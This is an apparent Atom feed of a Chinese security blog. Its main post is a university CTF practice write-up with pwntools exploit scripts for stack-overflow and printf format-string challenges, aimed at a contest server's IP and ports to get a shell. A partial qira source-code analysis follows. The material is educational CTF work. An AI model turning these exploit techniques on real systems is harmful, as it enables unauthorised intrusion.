<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-05T14:31:38.978Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>PwnHt</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>test</title>
    <link href="http://yoursite.com/2019/11/05/test/"/>
    <id>http://yoursite.com/2019/11/05/test/</id>
    <published>2019-11-05T14:31:08.000Z</published>
    <updated>2019-11-05T14:31:38.978Z</updated>
    
    <content type="html"><![CDATA[<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;test&quot;&gt;&lt;a href=&quot;#test&quot; class=&quot;headerlink&quot; title=&quot;test&quot;&gt;&lt;/a&gt;test&lt;/h3&gt;
      
    
    </summary>
    
    
    
      <category term="test" scheme="http://yoursite.com/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>2019冬季赛第一周习题练习总结</title>
    <link href="http://yoursite.com/2019/11/05/2019%E5%86%AC%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%B8%80%E5%91%A8%E4%B9%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/</id>
    <published>2019-11-05T08:18:00.000Z</published>
    <updated>2019-11-05T14:12:58.292Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>冬季赛第一周练习题目完美结束，从周日搭环境（<del>周末每天早出晚归，我感觉我要死了</del>）到现在审核writeup，没有出现什么大问题（<del>我周日下午花了一下午布置题目，测试题目是否能打通，然后，然后,2个小时，2道题目被打穿了，？？？？这里手动@哒君，出的什么题目？？？？，还得让我加班</del>），（<del>其实也不能怪哒君因为</del>）我们18级还是有大佬的（<del>iyzyi牛啤，拿到了3道pwn题目的一血</del>）</p><h1 id="0x01-练习题目重大时间表"><a href="#0x01-练习题目重大时间表" class="headerlink" title="0x01 练习题目重大时间表"></a>0x01 练习题目重大时间表</h1><ul><li>周日下午first try、easy_second_try题目上线</li><li>周日晚上iyzyi拿到两道题目的一血</li><li>周日晚上printf题目上线</li><li>周一晚上给出hint</li><li>周一晚上iyzyi拿到printf题目的一血</li><li>周一晚上normal(第一周压轴题)上线</li><li>截止周二晚上还没有被解出（<del>哒君tql</del>）</li></ul><h1 id="0x02-最终版writeup-by-iyzyi"><a href="#0x02-最终版writeup-by-iyzyi" class="headerlink" title="0x02 最终版writeup by iyzyi"></a>0x02 最终版writeup by iyzyi</h1><h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>刚开始学pwn，有些地方可能理解的不对，有错误的话希望大家可以指出来，谢谢。</p><p>使用到了<strong>python2 </strong>的一个模块pwn（pip时Ubuntu下是pwn、CentOS7中是pwntools），不能在windows下使用。</p><p>python3应该也可以使用pwntools，但我还没有实践过，这里不详细说。</p><p>我的环境为Ubuntu16.04，python2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#Ubuntu下安装pwn</span><br><span class="line">apt-get update</span><br><span class="line">apt install python-pip</span><br><span class="line">pip install pwn</span><br><span class="line"></span><br><span class="line">#CentOS7下安装pwntools</span><br><span class="line">#http://www.ishenping.com/ArtInfo/234398.html</span><br><span class="line">#https://github.com/facebook/prophet/issues/418</span><br><span class="line">#注意：python2和python3同时存在的，所有pip命令都要加上python2 -m的前缀</span><br><span class="line">#如python2 -m pip install pwntools</span><br><span class="line">yum -y install python-pip</span><br><span class="line">pip install --upgrade setuptools</span><br><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>Ubuntu比较适合pwntools，CentOS的坑比较多。推荐Ubuntu哈</p><h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p><strong>ubuntu安装的时候也可以安装pwntools</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>我之前都不知道有pwn这个库，但是用法是一样的，却是两个库，额，建议pwntools哈，可以从下面来，pwn这个最后一次更新在2014，好像已经停止更新了，而pwntools最后一次更新是在2019（<del>一看 <strong>pwntools</strong> 的 <strong>decription</strong> 就比较帅，知道选谁了吧</del>）</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1572938462520.png" alt="1572938462520"></p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1572938436162.png" alt="1572938481627"></p><h2 id="0x01-first-try"><a href="#0x01-first-try" class="headerlink" title="0x01 first try"></a>0x01 first try</h2><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/2174619181.png" alt="1572860587050"></p><p>32位，用ida打开，按下f5将汇编转换成伪C代码。</p><h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-1"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-1" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>理论上来说，我们第一步是checksec，一般pwn题目是不加壳的，但是，会有一些程序保护（<del>详情参考的我ppt程序保护部分</del>），幸运的是这几道题目都没保护2333，其实，checksec是有一个脚本的，但是我更喜欢用ipython这个程序,安装ipython</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ipython</span><br></pre></td></tr></table></figure><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1572939083748.png" alt="1572939083748"></p><p>像这样操作，linux里面arch表示程序的是哪种操作系统类型（i386为32位，amd64为64位），然后下面是4种保护，红色表示程序保护没开，绿色表示开启</p><p>（<del>其实ida也能分辨64位和32位试一试就知道会有标识的</del>）</p><p>（<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">![1572861112066](2019冬季赛第一周习题练习总结\2553210574.png)</span><br><span class="line"></span><br><span class="line">要想拿到shell，就要满足v6=99(第30行)。</span><br><span class="line"></span><br><span class="line">本题存在两处输入，其中第11行的read()函数存在明显的栈溢出。</span><br><span class="line"></span><br><span class="line">双击程序中的任意参数或局部变量，均可跳转至所在函数的栈界面：</span><br><span class="line"></span><br><span class="line">![1572861550853](2019冬季赛第一周习题练习总结\1141603613.png)</span><br><span class="line"></span><br><span class="line">容易发现，s字符串的长度为0x1C-0x0C=16，而read()函数可以读入50个字符。当读完16个字符后，如果继续输入，程序并不会停止，而是继续将数据读入栈中，这就会覆盖掉其他的数据。比如写入的第17个字符会覆盖掉上图中的var_C.</span><br><span class="line"></span><br><span class="line">var_C恰好就是之前的v6。</span><br><span class="line"></span><br><span class="line">把鼠标光标放在v6上，就会自动显示v6在栈内的位置。</span><br><span class="line"></span><br><span class="line">![1572861947922](2019冬季赛第一周习题练习总结\355552310.png)</span><br><span class="line"></span><br><span class="line">或者双击下v6。</span><br><span class="line"></span><br><span class="line">### 0x01 来自pwnht的评论（~~闲话/补充？？？？？~~）</span><br><span class="line"></span><br><span class="line">其实这里不用悬停的，或者双击的，因为</span><br><span class="line"></span><br><span class="line">![1572939698973](2019冬季赛第一周习题练习总结\1572939698973.png)</span><br><span class="line"></span><br><span class="line">滑一下鼠标就可以了，复杂的程序可以悬停，（~~都行其实2333，怎么快怎么来哈~~）</span><br><span class="line"></span><br><span class="line">（~~下面是分割线~~）</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">上图中的esp是栈顶指针，ebp是栈的基址。</span><br><span class="line"></span><br><span class="line">话有些多，直接写脚本吧。</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = remote(&apos;202.119.201.199&apos;, 10000)</span><br><span class="line">payload = &apos;a&apos;*(0x1c-0x0c) + p32(99)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">第一行，导入pwn模块</span><br><span class="line"></span><br><span class="line">第二行，连接到服务器</span><br><span class="line"></span><br><span class="line">第四行，sendline发送payload</span><br><span class="line"></span><br><span class="line">第五行，进入交互。此时输入cat flag即可拿到flag</span><br><span class="line"></span><br><span class="line">payload的前半部分就是16个字符，写满字符串s，第十七个字节就是我们要修改的v6.</span><br><span class="line"></span><br><span class="line">p32()可以将99转换成一个32位的数据。</span><br><span class="line"></span><br><span class="line">### 0x02 来自pwnht的评论（~~闲话/补充？？？？？~~）</span><br><span class="line"></span><br><span class="line">这里注意，写expliot脚本的一个好习惯，遇到 **read（）** 要用 **send（）** 不要用 **sendline（）**</span><br><span class="line"></span><br><span class="line">这道题目，两个都行，换其他题目可能会多读一个**\n** (换行符即&apos;\\x0a&apos;),  （~~注意大坑,相信我~~）</span><br><span class="line"></span><br><span class="line">还有遇到多次输入的时候，就不能用 **send（)** 函数了,要用 **sendafter（)** 或者 **sleep（）** 来控制流程</span><br><span class="line"></span><br><span class="line">附上我的expliot</span><br></pre></td></tr></table></figure></p><p>#!/usr/bin/env python<br>from pwn import *<br>context.log_level=’debug’<br>io=remote(‘202.119.201.199’,10000)</p><p>#io=process(‘./first’)</p><p>#gdb.attach(io)<br>io.sendafter(‘do you want to change it?(yes|no)\n’,’a’*0x10+p32(99))<br>io.interactive()<br>~~~</p><p>基本上差不多哈</p><p>（<del>下面是分割线</del>）</p><hr><h2 id="0x02-easy-second-try"><a href="#0x02-easy-second-try" class="headerlink" title="0x02 easy_second_try"></a>0x02 easy_second_try</h2><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/242793795.png" alt="1572862797345"></p><p>使用ida64打开</p><h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-2"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-2" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>同样需要checksec不多说</p><p>（<del>下面是分割线</del>）</p><hr><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1158424088.png" alt="1572862841416"></p><p>主函数输入姓名，输出姓名，就结束了。</p><p>同时可以看到read()明显的栈溢出。</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/3763989548.png" alt="1572862917274"></p><p>上面的s是输入的字符串，下面的s是ebp（<strong>此处存疑哈 </strong>），下面的r是函数运行完的返回地址。当这个函数运行完时，程序会跳转至r所储存的地址处，继续运行。</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/859230983.png" alt="1572432617470"></p><p>参考阅读《加密与解密》P106.</p><p>上图的栈和上上图的栈，顺序是相反的，对照的时候注意下。</p><p>函数列表内有个sys函数</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1992114906.png" alt="1572863298186"></p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/2464934511.png" alt="1572863306697"></p><p>可以调用shell.</p><p>所以我们通过read()函数，多读入一些字节，将r返回地址覆写为sys的地址，就可以调用这个shell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'202.119.201.199'</span>, <span class="number">10002</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(<span class="number">0x400789</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>payload中，0x10是字符串长度，8是8位的ebp，0x400789是sys的地址，p64将其转换为64位的数据</p><p>就酱~</p><h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-3"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-3" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>同样的问题不在赘述</p><p>下面是分割线</p><hr><h2 id="0x03-printf"><a href="#0x03-printf" class="headerlink" title="0x03 printf"></a>0x03 printf</h2><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/3267216144.png" alt="1572928882030"></p><p>随机一个数字，输入一个数字，二者相等则拿到shell.</p><p>第25行存在printf格式化字符串漏洞。</p><p>先来看一下相关知识：</p><ul><li><a href="https://wiki.x10sec.org/pwn/fmtstr/fmtstr_exploit/" target="_blank" rel="noopener">CTF WiFi：格式化字符串漏洞利用</a></li><li><a href="https://blog.qsboy.com/format-string-bug/" target="_blank" rel="noopener">CTF - Pwn - 格式化字符串漏洞</a></li><li><a href="https://introspelliam.github.io/2017/08/04/printf%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">printf格式化漏洞</a></li><li><a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">格式化字符串漏洞学习</a></li></ul><p>我浅显地总结一下：</p><p>常见的printf有两（及以上）个参数，如<code>printf(&quot;%d&quot;, &amp;a);</code>。但其实printf只需要一个参数，<code>printf(&quot;%d%d&quot;);</code>，需要参数时从栈顶依次读入即可。前面的<code>printf(&quot;%d&quot;, &amp;a);</code>本质上就是先把a的地址压入栈内，然后printf读栈顶元素并输出。</p><p>printf函数的第一个参数就是格式化字符串。</p><p>正常的程序，这个格式化字符串应该是写死在代码里的，但是本题printf的那个字符串是我们输入的，所以我们可以通过一些方式来输出一些数据（或写入一些数据）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure><p>%x表示输出栈顶的那个十六进制数据，%i$x表示输出偏离栈顶i处的十六进制数据。</p><p>我们现来测试下程序运行到printf()处，栈的情况。</p><p>did you hear that?输入长度不超过16的字符串即可。然后do you understand输入7个%p，程序输入从栈顶到偏移栈顶7个32位处的7个十六进制数。</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/233118200.png" alt="1572930088113"></p><p>第7个参数输出的是%p%p(0x70是p,0x25是%)，所以我们确定了输入的%p%p%p%p%p%p%p这个字符串是从栈内偏移7处开始的(ebp+7)。<br><img src="/2019/11/05/2019冬季赛第一周习题练习总结/724262807.png" alt="1572930264700"></p><p>0x2c处就是我们输入的字符串的起始位置。我们想要知道的那个随机数在0x0C的var_C处。二者偏移量为（0x2c-0x0c)//4=8，除以4是因为这是32位程序。</p><p>buf相对栈顶偏移7，var_C相对buf偏移8，即var_C相对栈顶偏移15</p><p>不用脚本，直接手撸</p><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/4065706008.png" alt="1572866025044"></p><p>拿到随机数0xa08457，转换成十进制数10519639，输进去，拿到shell.</p><h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-4"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-4" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>你的非预期解呢？？？？？？</p><h3 id="0x01-来自iyzyi的补充"><a href="#0x01-来自iyzyi的补充" class="headerlink" title="0x01 来自iyzyi的补充"></a>0x01 来自iyzyi的补充</h3><p>嗯，这道题在pwnht提示我之前，我不是这么考虑的。</p><p>先说一下格式化字符串中的%n。%n的作用是向保存在栈顶的一个地址处写入一个数，这个数是字符串中位于%n前面的字符的数量。%i$n的作用类似，不过是向偏移栈顶i处保存的地址中写入一个数。比如，对照着上上上图，“abc%6$n”就是向0xf770f244处写入3.</p><p>但是，一定要注意，对应的栈中的参数必须是一个合法的地址。比如对照着上上上图，“abc%2$n”就是向0x10处写入3。0x10不是个地址，所以程序会崩溃。</p><p>有了以上知识，那我就开始说一下我最初的思路，非预期解。应该可以解题，但是成功的概率实在感人。</p><p>我是想通过%n向v8处写入一个数，然后我再输入这个数，自然就可以拿到shell.</p><p>但是，万万没有想到，这题v8的地址是一直在改变的，根据我的多次测试，其地址大概位于0xff800000到0xffffffff之间。</p><p>于是我就想碰撞一下地址。我在程序里写了个地址，假设它就是字符串的地址，再通过偏移量算出v8的地址。如果某一次程序恰好将字符串加载到我假设的地址处，那么我就可以向v8写入相应的字符数量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">'202.119.201.199'</span>, <span class="number">10001</span>)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">        p.sendlineafter(<span class="string">'Did you hear that?'</span>, <span class="string">'yes\n'</span>)</span><br><span class="line">        payload = p32(<span class="number">0xff9594ec</span>+(<span class="number">0x2c</span><span class="number">-0xc</span>)) + <span class="string">'%7$n'</span></span><br><span class="line">        p.sendlineafter(<span class="string">'do you understand?'</span>, payload)</span><br><span class="line">        p.sendlineafter(<span class="string">'just tell me how mang is it!'</span>, <span class="string">'4'</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'EFO again~~~~~'</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> p.recvline_contains(<span class="string">'haha, I know you can\'t do it!'</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'NO~~~~~~'</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure><p>如果%7$n不是向一个合法的地址处写入，程序会timeout: the monitored command dumped core\n，报错EOFError。为了程序的程序化运行，捕捉了这个异常。</p><p>如果恰好碰撞到了一个地址，但是又不是我们需要的那个目标地址，程序会按照流程输出haha, I know you can\’t do it! 此时我们使用continue跳过这次碰撞。</p><p>对了，说明一下，这个脚本不一定正确哈。我还没有跑出来（跑得CPU都糊了）。有兴趣的可以试试。</p><p>为了说明一下成功的概率，我放一个数字：0xffffffff-0xff800000=0x7fffff=2^23=8388608。</p><h2 id="0x04-来自pwnht的结语"><a href="#0x04-来自pwnht的结语" class="headerlink" title="0x04 来自pwnht的结语"></a>0x04 来自pwnht的结语</h2><p>小学弟整体写的还是比较认真的，值得表扬，一些d地方需要改进，希望采纳，注意文章结构，一道题目要分步骤的，一步写完可不行 2333（<del>iyzyi牛啤拿下本周pwn三个一血</del>）</p>]]></content>
    
    <summary type="html">
    
      2019冬季赛第一周pwn练习题目完美结束
    
    </summary>
    
    
    
      <category term="2019cumtctf" scheme="http://yoursite.com/tags/2019cumtctf/"/>
    
  </entry>
  
  <entry>
    <title>整数溢出思考</title>
    <link href="http://yoursite.com/2019/11/03/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%80%9D%E8%80%83/"/>
    <id>http://yoursite.com/2019/11/03/整数溢出思考/</id>
    <published>2019-11-03T01:17:48.000Z</published>
    <updated>2019-11-03T01:17:48.801Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>qira源码分析</title>
    <link href="http://yoursite.com/2019/10/28/qira%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/10/28/qira源码分析/</id>
    <published>2019-10-28T12:54:29.000Z</published>
    <updated>2019-10-29T16:05:53.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前很早用过 <strong>qira</strong> 这款工具，由于种种原因（<del>安装太难了、界面ui。。。</del>），做一些二进制分析，还是gdb好用，在和18、19级培训完之后，老师说ppt应该多加图片，但是之后培训动态调试程序的时候，因为学弟、学妹们都比较萌新用gdb调试，肯定都会看蒙掉，需要一些可复现而且操作简单的gui工具，所以，我想到了qira，但是qira的界面太乱了，我准备优化一下，要改就要知道运行原理，所以，我准备先分析一下源代码（<del>还好qira是开源的，真好</del>）</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p><del>尽人事，听天命，如果，不行就换个虚拟机吧。。。。</del><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/geohot/qira.git</span><br><span class="line">cd qira</span><br><span class="line">sudo ./install.sh</span><br></pre></td></tr></table></figure></p><p>还是安装最新版的吧</p><h1 id="0x02-安装过程分析"><a href="#0x02-安装过程分析" class="headerlink" title="0x02 安装过程分析"></a>0x02 安装过程分析</h1><p>首先分析一下 <strong>install.sh</strong> 脚本，执行了以下几个步骤：</p><ul><li><p>安装一些工具</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install git curl python python-virtualenv python-dev build-essential pkg-config zlib1g-dev libglib2.0-dev libpixman-1-dev</span><br></pre></td></tr></table></figure></li><li><p>构建qemu(见源码tracers/qemu_build.sh)</p></li><li><p>构建python虚拟环境</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">virtualenv venv</span><br><span class="line">source venv/bin/activate</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>运行测试脚本</p></li><li>建立软连接到 <strong>/usr/local/bin</strong>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -sf $(pwd)/qira /usr/local/bin/qira</span><br></pre></td></tr></table></figure></li></ul><p>这样就完成了安装，那么我们运行qira程序的时候，其实，是运行qira源码文件夹下qira这个脚本</p><h1 id="0x03-qira脚本分析"><a href="#0x03-qira脚本分析" class="headerlink" title="0x03 qira脚本分析"></a>0x03 qira脚本分析</h1><ul><li>先是做一些判断</li><li>清除PYTHONPATH环境变量</li><li><p>导入新的环境变量</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source $DIR/venv/bin/activate</span><br></pre></td></tr></table></figure></li><li><p>运行/middleware/qira.py文件</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec /usr/bin/env python $DIR/middleware/qira.py $*</span><br></pre></td></tr></table></figure></li></ul><p>那么继续跟进</p><h1 id="0x04-middleware-qira-py脚本分析"><a href="#0x04-middleware-qira-py脚本分析" class="headerlink" title="0x04 /middleware/qira.py脚本分析"></a>0x04 /middleware/qira.py脚本分析</h1><ul><li>首先设置设置参数，解析参数(<del>就不粘贴了</del>)</li><li>然后执行  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">program = qira_program.Program(args.binary, args.args, qemu_args)</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x00-调用了qira-program-py下Program类"><a href="#0x00-调用了qira-program-py下Program类" class="headerlink" title="0x00 调用了qira_program.py下Program类"></a>0x00 调用了qira_program.py下Program类</h2><p>看一下该类的 <strong>init</strong> 函数</p><ul><li><p>首先创建log文件</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.mkdir(qira_config.TRACE_FILE_BASE)</span><br></pre></td></tr></table></figure><p>  再看一下，qira_config.py的trace_file_base全局变量</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if os.name == &quot;nt&quot;:</span><br><span class="line">    TRACE_FILE_BASE = &quot;c:/qiratmp&quot;</span><br><span class="line">else:</span><br><span class="line">    TRACE_FILE_BASE = &quot;/tmp/qira_logs/&quot;</span><br></pre></td></tr></table></figure><p>  判断一下系统类型，根据不同的系统类型，定制不同的路径</p></li><li><p>之后调用 <strong>which</strong> 函数</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.program = which(prog)</span><br></pre></td></tr></table></figure><p>  看一下 <strong>which</strong> 函数</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def which(prog):</span><br><span class="line">    try:</span><br><span class="line">        cmd = [&quot;which&quot;, prog]</span><br><span class="line">        p = subprocess.Popen(cmd, stdout=subprocess.PIPE)</span><br><span class="line">        res = p.stdout.readlines()</span><br><span class="line">        if len(res) == 0:</span><br><span class="line">            raise Exception(&quot;binary not found&quot;)</span><br><span class="line">        return os.path.realpath(res[0].strip())</span><br><span class="line">    except:</span><br><span class="line">    # fallback mode, look for the binary straight up</span><br><span class="line">        if os.path.isfile(prog):</span><br><span class="line">            return os.path.realpath(prog)</span><br><span class="line">        else:</span><br><span class="line">            raise Exception(&quot;binary not found&quot;)</span><br></pre></td></tr></table></figure><p>  这个函数主要是用找程序的真实路径，现在 <strong>PATH</strong> 中找，然后判断 <strong>prog</strong> 是否为一个文件，如果是的话，就找到真实的路径</p></li><li>之后，就是参数复制</li><li><p>初始化static成员变量</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.static = static2.Static(self.program)</span><br></pre></td></tr></table></figure><p>  再来看一下static2.py的static类的 <strong>init</strong> 函数</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loader.load_binary(self)</span><br></pre></td></tr></table></figure><p>  调用loader.py文件的 <strong>load_binary()</strong> 函数</p><ul><li>再看一下load_binary()函数，这个函数是获得文件的架构，程序入口地址，以及plt表之类的信息</li></ul></li><li><p>之后就判断 <strong>program</strong> 